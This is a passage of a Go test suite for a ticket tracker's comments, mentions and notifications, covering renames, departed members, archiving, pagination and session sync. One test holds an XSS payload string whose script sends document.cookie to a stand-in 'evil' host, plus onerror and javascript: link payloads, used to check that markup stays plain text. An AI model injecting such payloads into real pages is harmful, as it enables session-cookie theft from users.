		t.Fatalf("the conversation lost comments when a member left: %d", len(l.Comments))
	}
	got := l.Comments[0]
	if got.ID != c.ID || got.AuthorName != "Lee" || got.AuthorID != leaver.Member.ID || !got.AuthorFormer || got.CanEdit || got.CanDelete {
		t.Fatalf("a comment of a member who left: %+v", got)
	}
	if reply := l.Comments[1]; reply.Segments[1].Name != "Lee" || reply.Segments[1].MemberID != leaver.Member.ID {
		t.Fatalf("a mention of a member who left: %+v", reply.Segments)
	}
	// Bo's notification of Lee's comment still names Lee, as the former member they are.
	items := tm.inbox(tm.bo).Notifications
	if len(items) != 1 || items[0].AuthorName != "Lee" || !items[0].AuthorFormer {
		t.Fatalf("a notification from someone who left: %+v", items)
	}
	// The words of someone who left can still be edited around: an edit of a comment mentioning them keeps that mention.
	reply := l.Comments[1]
	edited, err := tm.edit(tm.owner, reply, txt("thanks again "), at(leaver))
	if err != nil || edited.Segments[1].Name != "Lee" {
		t.Fatalf("keeping the mention of a member who left: %+v %v", edited, err)
	}
	// ... but they cannot be mentioned afresh.
	_, err = tm.edit(tm.owner, edited, txt("thanks again "), at(leaver), txt(" and "), at(tm.bo))
	if err != nil {
		t.Fatalf("a mention that was already there must not stop other edits: %v", err)
	}
	_, _, err = tm.svc.PostComment(bg, tm.owner, tm.pid(), k.ID, CommentInput{ClientID: "client-leaver-1", Segments: []domain.Segment{txt("hello "), at(leaver)}})
	wantErr(t, err, domain.ErrInvalid)
}

// Renaming a member must not break what mentions them: it is bound to their id, and shows the name they have now.
func TestRenamingAMemberDoesNotBreakTheirMentions(t *testing.T) {
	if sharedCluster != nil {
		t.Skip("renames the member in the database file directly, which is not the cluster's")
	}
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Renames", domain.TicketAvailable)
	c := tm.say(tm.owner, k, txt("ping "), at(tm.bo))
	raw, err := sql.Open("sqlite", "file:"+tm.path+"?_pragma=busy_timeout(5000)")
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	if _, err := raw.Exec(`UPDATE members SET name = 'Robert' WHERE id = ?`, tm.bo.Member.ID); err != nil {
		t.Fatal(err)
	}
	l := tm.comments(tm.cy, k, CommentListQuery{})
	if got := l.Comments[0]; got.ID != c.ID || got.Segments[1].MemberID != tm.bo.Member.ID || got.Segments[1].Name != "Robert" || plain(got) != "ping @Robert" {
		t.Fatalf("the mention after a rename: %+v", got.Segments)
	}
	// Bo is still told, and still finds it, and the quotation uses the new name for whoever else it names.
	n := tm.inbox(tm.bo).Notifications
	if len(n) != 1 || n[0].CommentID != c.ID || n[0].Excerpt != "ping @Robert" {
		t.Fatalf("the notification after a rename: %+v", n)
	}
	if !tm.comments(tm.bo, k, CommentListQuery{}).Comments[0].MentionsMe {
		t.Error("the renamed member's mention is no longer theirs")
	}
	// An author who was renamed is shown by the name they have now.
	if _, err := raw.Exec(`UPDATE members SET name = 'Adeline' WHERE id = ?`, tm.owner.Member.ID); err != nil {
		t.Fatal(err)
	}
	if got := tm.comments(tm.cy, k, CommentListQuery{}).Comments[0]; got.AuthorName != "Adeline" || got.AuthorFormer {
		t.Fatalf("the author after a rename: %+v", got)
	}
}

// ---- text is only ever text ----

func TestMarkupInACommentIsStoredAndReturnedAsPlainText(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Hostile", domain.TicketAvailable)
	const evil = `<script>fetch('//evil/'+document.cookie)</script><img src=x onerror=alert(1)> [x](javascript:alert(1)) &lt;b&gt;`
	c := tm.say(tm.bo, k, txt(evil), at(tm.cy))
	got := tm.comments(tm.cy, k, CommentListQuery{}).Comments[0]
	if got.ID != c.ID || got.Segments[0].Type != domain.SegmentText || got.Segments[0].Text != evil {
		t.Fatalf("what was written changed: %+v", got.Segments[0])
	}
	if ex := tm.inbox(tm.cy).Notifications[0].Excerpt; !strings.HasPrefix(ex, "<script>fetch") {
		t.Errorf("the quotation: %q", ex)
	}
	// What a client cannot do is send anything but text and mentions.
	for _, bad := range []domain.Segment{{Type: "html", Text: "<b>x</b>"}, {Type: "link", Text: "x"}, {Type: ""}, {Type: domain.SegmentText, Text: "a\x00b"}, {Type: domain.SegmentText, Text: "a‮b"}} {
		_, _, err := tm.svc.PostComment(bg, tm.bo, tm.pid(), k.ID, CommentInput{ClientID: fmt.Sprintf("client-%06d", commentCounter.Add(1)), Segments: []domain.Segment{bad}})
		wantErr(t, err, domain.ErrInvalid)
	}
}

// ---- tickets that are done or archived ----

func TestCommentsOnFinishedTicketsAreKeptAndArchivedOnesAreReadOnly(t *testing.T) {
	tm := newTeam(t)
	k := tm.working(tm.bo, "Ship it")
	c := tm.say(tm.owner, k, txt("looks good, "), at(tm.cy))
	// A ticket that is done is still talked about.
	if _, err := tm.svc.SubmitTicket(bg, tm.bo, tm.pid(), k.ID, SubmitInput{}); err != nil {
		t.Fatal(err)
	}
	if _, err := tm.svc.CompleteTicket(bg, tm.di, tm.pid(), k.ID); err != nil {
		t.Fatal(err)
	}
	if l := tm.comments(tm.cy, k, CommentListQuery{}); !l.CanPost || l.ReadOnly || len(l.Comments) != 1 {
		t.Fatalf("a done ticket: %+v", l)
	}
	d := tm.say(tm.cy, k, txt("shipped, thanks "), at(tm.owner))
	if _, err := tm.edit(tm.cy, d, txt("shipped, thanks again "), at(tm.owner)); err != nil {
		t.Fatalf("editing on a done ticket: %v", err)
	}
	// Archiving keeps every comment and every unread mention, and makes the conversation read-only.
	cur, err := tm.svc.GetTicket(bg, tm.owner, tm.pid(), k.ID)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := tm.svc.ArchiveTicket(bg, tm.owner, tm.pid(), k.ID, cur.Version, true); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.cy) != 1 || tm.unread(tm.owner) != 1 {
		t.Fatalf("archiving cleared mentions: cy=%d ada=%d", tm.unread(tm.cy), tm.unread(tm.owner))
	}
	l := tm.comments(tm.cy, k, CommentListQuery{})
	if !l.ReadOnly || l.CanPost || len(l.Comments) != 2 || l.Comments[0].CanEdit || l.Comments[1].CanEdit || l.Comments[0].CanDelete || l.Comments[1].CanDelete {
		t.Fatalf("an archived ticket's conversation: %+v", l)
	}
	_, _, err = tm.svc.PostComment(bg, tm.cy, tm.pid(), k.ID, CommentInput{ClientID: "client-arch-01", Segments: []domain.Segment{txt("late")}})
	wantErr(t, err, domain.ErrConflict)
	_, err = tm.edit(tm.cy, l.Comments[1], txt("late edit"))
	wantErr(t, err, domain.ErrConflict)
	_, err = tm.svc.DeleteComment(bg, tm.owner, tm.pid(), k.ID, c.ID, nil) // even a manager
	wantErr(t, err, domain.ErrConflict)
	// The mention can still be opened and marked read: that is the reader's own, and changes nothing on the ticket.
	items := tm.inbox(tm.cy).Notifications
	if len(items) != 1 || !items[0].Archived {
		t.Fatalf("a mention on an archived ticket: %+v", items)
	}
	if got := tm.comments(tm.cy, k, CommentListQuery{Around: items[0].CommentID}); got.Focus != items[0].CommentID {
		t.Errorf("opening it: %+v", got)
	}
	if _, err := tm.svc.MarkNotificationRead(bg, tm.cy, items[0].ID); err != nil {
		t.Fatal(err)
	}
	// Restoring it makes the conversation writable again, with everything in it.
	cur, _ = tm.svc.GetTicket(bg, tm.owner, tm.pid(), k.ID)
	if _, err := tm.svc.ArchiveTicket(bg, tm.owner, tm.pid(), k.ID, cur.Version, false); err != nil {
		t.Fatal(err)
	}
	if l := tm.comments(tm.cy, k, CommentListQuery{}); l.ReadOnly || !l.CanPost || len(l.Comments) != 2 {
		t.Fatalf("a restored ticket: %+v", l)
	}
	// An archived project is as read-only as an archived ticket.
	archived := true
	if _, err := tm.svc.UpdateProject(bg, tm.owner, tm.pid(), ProjectPatch{Archived: &archived}); err != nil {
		t.Fatal(err)
	}
	_, _, err = tm.svc.PostComment(bg, tm.cy, tm.pid(), k.ID, CommentInput{ClientID: "client-arch-02", Segments: []domain.Segment{txt("late")}})
	wantErr(t, err, domain.ErrConflict)
	if l := tm.comments(tm.cy, k, CommentListQuery{}); !l.ReadOnly || len(l.Comments) != 2 {
		t.Fatalf("an archived project: %+v", l)
	}
}

// ---- notifications: lists, counts, reading ----

func TestMarkingANotificationReadIsPersistentIdempotentAndMovesTheRevision(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Read state", domain.TicketAvailable)
	c := tm.say(tm.owner, k, txt("for you "), at(tm.bo))
	time.Sleep(3 * time.Millisecond) // notifications are ordered by the millisecond they were made
	tm.say(tm.owner, k, txt("and also "), at(tm.bo))
	items := tm.inbox(tm.bo).Notifications
	if len(items) != 2 || items[0].CommentID == c.ID || items[1].CommentID != c.ID {
		t.Fatalf("newest first: %+v", items)
	}
	// Opening it does not read it.
	list := tm.comments(tm.bo, k, CommentListQuery{Around: c.ID})
	if list.Focus != c.ID || list.UnreadMentions != 2 || tm.unread(tm.bo) != 2 || list.Comments[0].Notification == nil || list.Comments[0].Notification.Read {
		t.Fatalf("opening the comment: %+v", list)
	}
	before := tm.workspaceRevision(tm.bo)
	read, err := tm.svc.MarkNotificationRead(bg, tm.bo, items[1].ID)
	if err != nil || read.ReadAt == nil {
		t.Fatalf("mark read: %+v %v", read, err)
	}
	after := tm.workspaceRevision(tm.bo)
	if after <= before {
		t.Fatalf("reading a notification did not move the workspace revision (%d -> %d)", before, after)
	}
	if tm.unread(tm.bo) != 1 {
		t.Fatalf("unread after reading one: %d", tm.unread(tm.bo))
	}
	// Again: nothing changes, the first read time is kept, no revision moves.
	again, err := tm.svc.MarkNotificationRead(bg, tm.bo, items[1].ID)
	if err != nil || again.ReadAt == nil || !again.ReadAt.Equal(*read.ReadAt) || tm.workspaceRevision(tm.bo) != after {
		t.Fatalf("reading again: %+v %v", again, err)
	}
	// The ticket shows the comment as read, still highlighted as a mention of Bo's, and counts what is left.
	got := tm.comments(tm.bo, k, CommentListQuery{})
	if !got.Comments[0].MentionsMe || got.Comments[0].Notification == nil || !got.Comments[0].Notification.Read || got.UnreadMentions != 1 {
		t.Fatalf("a read mention in the ticket: %+v", got)
	}
	// It stays read: across sessions (a fresh sign-in), after other edits, and when listed with everything.
	bo2 := tm.signInAgain(tm.bo)
	if tm.unread(bo2) != 1 {
		t.Fatal("a second session of the same person sees another count")
	}
	if _, err := tm.edit(tm.owner, c, txt("for you, edited "), at(tm.bo)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(bo2) != 1 {
		t.Fatal("an edit reopened it")
	}
	all, err := tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{IncludeRead: true})
	if err != nil || len(all.Notifications) != 2 || all.Unread != 1 {
		t.Fatalf("everything: %+v %v", all, err)
	}
	if only := tm.inbox(tm.bo); len(only.Notifications) != 1 || only.Notifications[0].ReadAt != nil {
		t.Fatalf("unread ones: %+v", only)
	}
	// A notification that does not exist is not found.
	_, err = tm.svc.MarkNotificationRead(bg, tm.bo, "tnt_nothing")
	wantErr(t, err, domain.ErrNotFound)
}

func TestNotificationsComeInPagesAndPerProject(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Busy", domain.TicketAvailable)
	other := tm.project2Named("Second")
	if err := tm.svc.AddProjectMember(bg, tm.owner, other.ID, tm.bo.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	k2, err := tm.svc.CreateTicket(bg, tm.owner, other.ID, TicketInput{Title: "Elsewhere"})
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 7; i++ {
		tm.say(tm.owner, k, txt(fmt.Sprintf("note %d ", i)), at(tm.bo))
	}
	for i := 0; i < 2; i++ {
		if _, _, err := tm.svc.PostComment(bg, tm.owner, other.ID, k2.ID, CommentInput{ClientID: fmt.Sprintf("client-other-%02d", i), Segments: []domain.Segment{txt("hi "), at(tm.bo)}}); err != nil {
			t.Fatal(err)
		}
	}
	all := tm.inbox(tm.bo)
	if all.Unread != 9 || len(all.Notifications) != 9 || all.HasMore {
		t.Fatalf("every project: %d unread, %d listed", all.Unread, len(all.Notifications))
	}
	// Pages: no overlap, no gaps, newest first, and the count is of all of them.
	var seen []string
	cursor := ""
	for pages := 0; ; pages++ {
		l, err := tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{Limit: 4, Cursor: cursor})
		if err != nil {
			t.Fatal(err)
		}
		if l.Unread != 9 {
			t.Fatalf("a page reports %d unread", l.Unread)
		}
		for _, n := range l.Notifications {
			seen = append(seen, n.ID)
		}
		if !l.HasMore {
			if l.Next != "" || pages != 2 {
				t.Fatalf("the last page: %+v after %d", l, pages)
			}
			break
		}
		if l.Next == "" {
			t.Fatal("more pages and no cursor")
		}
		cursor = l.Next
	}
	if len(seen) != 9 {
		t.Fatalf("pages gave %d notifications", len(seen))
	}
	for i, n := range all.Notifications {
		if seen[i] != n.ID {
			t.Fatalf("page order differs at %d", i)
		}
	}
	// A project filter narrows the list and the count.
	shop, err := tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{ProjectID: tm.pid()})
	if err != nil || shop.Unread != 7 || len(shop.Notifications) != 7 {
		t.Fatalf("the first project: %+v %v", shop, err)
	}
	second, err := tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{ProjectID: other.ID})
	if err != nil || second.Unread != 2 || len(second.Notifications) != 2 || second.Notifications[0].ProjectName != "Second" {
		t.Fatalf("the second project: %+v %v", second, err)
	}
	// A project one cannot see is not there; a bad cursor and a huge limit are handled.
	_, err = tm.svc.ListNotifications(bg, tm.cy, NotificationListQuery{ProjectID: "tpj_nothing"})
	wantErr(t, err, domain.ErrNotFound)
	_, err = tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{Cursor: "garbage"})
	wantErr(t, err, domain.ErrInvalid)
	if l, err := tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{Limit: 100000}); err != nil || len(l.Notifications) != 9 {
		t.Fatalf("a huge limit: %v %v", len(l.Notifications), err)
	}
	// Counts on the overview agree, by project.
	ov, err := tm.svc.Overview(bg, tm.bo)
	if err != nil || ov.Mentions != 9 {
		t.Fatalf("overview: %d %v", ov.Mentions, err)
	}
	for _, p := range ov.Projects {
		want := map[string]int{tm.pid(): 7, other.ID: 2}[p.Project.ID]
		if p.Mentions != want {
			t.Errorf("%s: %d mentions, want %d", p.Project.Name, p.Mentions, want)
		}
	}
	if ov, _ := tm.svc.Overview(bg, tm.cy); ov.Mentions != 0 {
		t.Errorf("Cy has %d mentions on the overview", ov.Mentions)
	}
}

// ---- losing access ----

func TestNotificationsAreGoneWhenAccessIsLostAndDoNotComeBackOnRejoining(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Access", domain.TicketAvailable)
	tm.say(tm.owner, k, txt("for you "), at(tm.bo))
	n := tm.inbox(tm.bo).Notifications[0]
	// Bo leaves the project: the list, the count, the ticket and the notification itself are gone.
	if err := tm.svc.RemoveProjectMember(bg, tm.owner, tm.pid(), tm.bo.Member.ID); err != nil {
		t.Fatal(err)
	}
	if got := tm.inbox(tm.bo); got.Unread != 0 || len(got.Notifications) != 0 {
		t.Fatalf("Bo still sees %+v", got)
	}
	_, err := tm.svc.MarkNotificationRead(bg, tm.bo, n.ID)
	wantErr(t, err, domain.ErrNotFound)
	_, err = tm.svc.ListComments(bg, tm.bo, tm.pid(), k.ID, CommentListQuery{})
	wantErr(t, err, domain.ErrNotFound)
	_, err = tm.svc.ListNotifications(bg, tm.bo, NotificationListQuery{ProjectID: tm.pid()})
	wantErr(t, err, domain.ErrNotFound)
	if ov, _ := tm.svc.Overview(bg, tm.bo); ov.Mentions != 0 {
		t.Errorf("the overview of someone who left counts %d", ov.Mentions)
	}
	// Rejoining brings back the project, not the old notifications.
	if err := tm.svc.AddProjectMember(bg, tm.owner, tm.pid(), tm.bo.Member.ID, ""); err != nil {
		t.Fatal(err)
	}
	if got := tm.inbox(tm.bo); got.Unread != 0 || len(got.Notifications) != 0 {
		t.Fatalf("old notifications resurfaced on rejoining: %+v", got)
	}
	_, err = tm.svc.MarkNotificationRead(bg, tm.bo, n.ID)
	wantErr(t, err, domain.ErrNotFound)
	// The comment itself is there to be read (they may read the project's tickets again) but is no longer unread for them,
	// and an unrelated edit does not bring the notification back.
	c := tm.comments(tm.bo, k, CommentListQuery{}).Comments[0]
	if c.Notification != nil {
		t.Errorf("the comment carries a withdrawn notification: %+v", c.Notification)
	}
	if _, err := tm.edit(tm.owner, c, txt("for you, edited "), at(tm.bo)); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.bo) != 0 {
		t.Fatal("an unrelated edit brought a withdrawn notification back")
	}
	// A new mention is a new notification, and works again.
	tm.say(tm.owner, k, txt("welcome back "), at(tm.bo))
	if tm.unread(tm.bo) != 1 {
		t.Fatal("a new mention after rejoining does not reach them")
	}
}

func TestRemovingAMemberFromTheWorkspaceRemovesTheirNotifications(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Leaving", domain.TicketAvailable)
	tm.say(tm.owner, k, txt("for you "), at(tm.bo), at(tm.cy))
	if err := tm.svc.RemoveMember(bg, tm.owner, tm.bo.Member.ID); err != nil {
		t.Fatal(err)
	}
	if tm.unread(tm.cy) != 1 {
		t.Error("the other person's notification was removed with Bo's")
	}
	// Even if the same person (by token) were somehow still signed in, they are no longer a member.
	if _, err := tm.svc.ListNotifications(AuthenticatedContext(bg, tm.bo), tm.bo, NotificationListQuery{}); err == nil {
		t.Error("a removed member read notifications")
	}
}

// ---- keeping every session in step ----

func TestTheTwoMemberFlowAcrossSessions(t *testing.T) {
	tm := newTeam(t)
	k := tm.ticket(tm.owner, "Flow", domain.TicketAvailable)
	bo1, bo2 := tm.bo, tm.signInAgain(tm.bo) // two windows of the same person
	rev1, rev2 := tm.workspaceRevision(bo1), tm.workspaceRevision(bo2)
	if rev1 != rev2 {
		t.Fatal("two sessions of one workspace disagree on its revision")
	}

	// 1. Ada posts. Bo's windows, waiting on the workspace, are woken with a new revision.
	woken := make(chan WorkspaceSync, 2)
	for _, s := range []Actor{bo1, bo2} {
		go func() {
			r, err := tm.svc.WaitForWorkspaceChange(bg, s, rev1, -1, 10*time.Second)
			if err != nil {
				t.Error(err)
			}
			woken <- r
		}()
	}
	time.Sleep(100 * time.Millisecond)
	projectBefore := tm.projectRevision(tm.owner)
	c := tm.say(tm.owner, k, txt("Bo, can you take the checkout? "), at(tm.bo))
	for i := 0; i < 2; i++ {
		select {
		case r := <-woken:
			if !r.Changed || r.Revision <= rev1 {
				t.Fatalf("a window was woken with nothing new: %+v", r)
			}
		case <-time.After(8 * time.Second):
			t.Fatal("a session waiting for changes was not woken by a comment")
		}
	}
	if tm.projectRevision(tm.owner) <= projectBefore {
		t.Error("a comment did not move the project's revision")
	}

	// 2. Both of Bo's windows show the same unread notification; Cy's has none.
	for _, s := range []Actor{bo1, bo2} {
		got := tm.inbox(s)
		if got.Unread != 1 || got.Notifications[0].CommentID != c.ID || got.Notifications[0].AuthorName != "Ada" {
			t.Fatalf("notification: %+v", got)
		}
	}
	if tm.unread(tm.cy) != 0 {
		t.Fatal("somebody else was told")
	}

	// 3. Opening it loads the ticket's comments around that one and highlights it; opening alone reads nothing.
	page := tm.comments(bo1, k, CommentListQuery{Around: c.ID})
	if page.Focus != c.ID || len(page.Comments) != 1 || !page.Comments[0].MentionsMe || page.Comments[0].Notification == nil || page.Comments[0].Notification.Read {
		t.Fatalf("opened: %+v", page)
	}
	if tm.unread(bo1) != 1 || tm.unread(bo2) != 1 {
		t.Fatal("opening a notification read it")
	}

	// 4. Bo marks it read in one window; the other, woken by the revision, finds the counts clear.
	rev := tm.workspaceRevision(bo2)
	go func() {
		time.Sleep(100 * time.Millisecond)
		if _, err := tm.svc.MarkNotificationRead(bg, bo1, page.Comments[0].Notification.ID); err != nil {
			t.Error(err)
		}
	}()
	r, err := tm.svc.WaitForWorkspaceChange(bg, bo2, rev, -1, 10*time.Second)
	if err != nil || !r.Changed || r.Revision <= rev {
		t.Fatalf("the other window was not told: %+v %v", r, err)
	}
	for _, s := range []Actor{bo1, bo2} {
		if tm.unread(s) != 0 {
			t.Fatal("a window still counts a notification that was read")
		}
		if ov, _ := tm.svc.Overview(bg, s); ov.Mentions != 0 {
			t.Fatal("the overview still counts it")
		}
		if got := tm.comments(s, k, CommentListQuery{}); got.UnreadMentions != 0 || !got.Comments[0].Notification.Read {
			t.Fatalf("the ticket still shows it unread: %+v", got.Comments[0].Notification)
		}
	}
}
